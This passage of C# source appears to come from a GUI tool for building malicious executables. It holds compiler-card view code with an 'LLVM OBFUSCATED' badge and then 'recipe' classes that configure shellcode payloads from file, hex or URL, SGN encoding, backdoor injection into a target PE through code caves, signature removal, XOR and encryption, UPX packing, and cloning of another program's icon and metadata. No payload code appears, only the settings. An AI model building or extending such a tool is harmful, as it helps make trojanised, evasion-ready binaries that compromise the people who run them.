        bool isLlvm = c.Kind.StartsWith("LLVM", StringComparison.OrdinalIgnoreCase);

        // Pick a glyph + accent color per family. Keeps the cards visually distinct.
        // Segoe MDL2: E945 = chip, EC4A = beaker, E7C3 = network, E81E = console.
        string glyph;
        Color accent;
        if (c.Kind.Equals("MSVC", StringComparison.OrdinalIgnoreCase))
            { glyph = ""; accent = Color.FromArgb(0xFF, 0x5C, 0x2D, 0x91); }   // VS purple
        else if (c.Kind.StartsWith("LLVM Clang-cl", StringComparison.OrdinalIgnoreCase))
            { glyph = ""; accent = Color.FromArgb(0xFF, 0x26, 0x2D, 0x91); }   // clang-cl indigo
        else if (c.Kind.StartsWith("LLVM", StringComparison.OrdinalIgnoreCase))
            { glyph = ""; accent = Color.FromArgb(0xFF, 0x6D, 0x28, 0xD9); }   // LLVM violet
        else if (c.Kind.StartsWith("MinGW", StringComparison.OrdinalIgnoreCase))
            { glyph = ""; accent = Color.FromArgb(0xFF, 0x0E, 0x7A, 0x0D); }   // gcc green
        else
            { glyph = ""; accent = Color.FromArgb(0xFF, 0x60, 0x60, 0x60); }   // fallback

        Color badgeColor = isLlvm
            ? Color.FromArgb(0xFF, 0x6D, 0x28, 0xD9)
            : Color.FromArgb(0xFF, 0x0E, 0x7A, 0x0D);

        return new CompilerCardViewModel
        {
            Kind = c.Kind,
            Path = c.Path,
            Edition = string.IsNullOrWhiteSpace(c.Edition) ? "Local" : c.Edition,
            Glyph = glyph,
            IsLlvm = isLlvm,
            BackendBadge = isLlvm ? "LLVM OBFUSCATED" : "DETERMINISTIC",
            AccentBrush = new SolidColorBrush(accent),
            BackendBadgeBrush = new SolidColorBrush(badgeColor),
        };
    }
}

// ═══════════════════════════════════════════════════════════════════════
//  Recipe serialization models
// ═══════════════════════════════════════════════════════════════════════

public sealed class PipelineRecipe
{
    public int Version { get; set; } = 1;
    public DateTime CreatedAt { get; set; }
    public PayloadRecipe? Payload { get; set; }
    public BackdoorRecipe? Backdoor { get; set; }
    public PackingRecipe? Packing { get; set; }
    public FinalizeRecipe? Finalize { get; set; }
    public CompileRecipe? Compile { get; set; }
}

public sealed class PayloadRecipe
{
    public string? Source { get; set; }
    public string? File { get; set; }
    public string? RawHex { get; set; }
    public string? Url { get; set; }
    public string? Generic { get; set; }
    public string? TemplateId { get; set; }
    public int? EncoderIndex { get; set; }
    public int? EnvelopeIndex { get; set; }
    public bool SgnEnabled { get; set; }
    public int SgnEncodeCount { get; set; } = 1;
    public int SgnMaxBytes { get; set; } = 50;
    public string SgnPlacement { get; set; } = "pre";
    public Dictionary<string, string> SnippetCombos { get; set; } = new();
    public Dictionary<string, string> SnippetTexts { get; set; } = new();
    public Dictionary<string, List<string>> SnippetLists { get; set; } = new();
}

public sealed class BackdoorRecipe
{
    public bool Enabled { get; set; }
    public string? TargetPePath { get; set; }
    public string? InjectionMethod { get; set; }
    public string? CarrierInvoke { get; set; }
    public bool PreserveEntry { get; set; } = true;
    public bool PatchIat { get; set; } = true;
    public bool RemoveSignature { get; set; } = true;
    public bool PatchSubsystem { get; set; } = true;
    public bool PatchExit { get; set; } = true;
    public bool DryRun { get; set; }
    public string? XorKey { get; set; }
    public string? SectionName { get; set; }
    public int CaveMinSize { get; set; } = 64;
    public string? Encryption { get; set; }
}

public sealed class PackingRecipe
{
    public bool Enabled { get; set; }
    public string? CompressionLevel { get; set; }
    public string? UpxArgs { get; set; }
}

public sealed class FinalizeRecipe
{
    public bool Enabled { get; set; }
    public bool CloneEnabled { get; set; }
    public string? CloneSource { get; set; }
    public bool CloneResources { get; set; } = true;
    public bool CloneIcon { get; set; } = true;
    public bool CloneMetadata { get; set; } = true;
    public long NopPaddingBytes { get; set; }
}

public sealed class CompileRecipe
{
    public string? OutputPath { get; set; }
    public bool OpenFolderAfter { get; set; } = true;
    public bool GenerateDebugInfo { get; set; }
    public bool StripToBin { get; set; }
    public bool Verbose { get; set; }
}
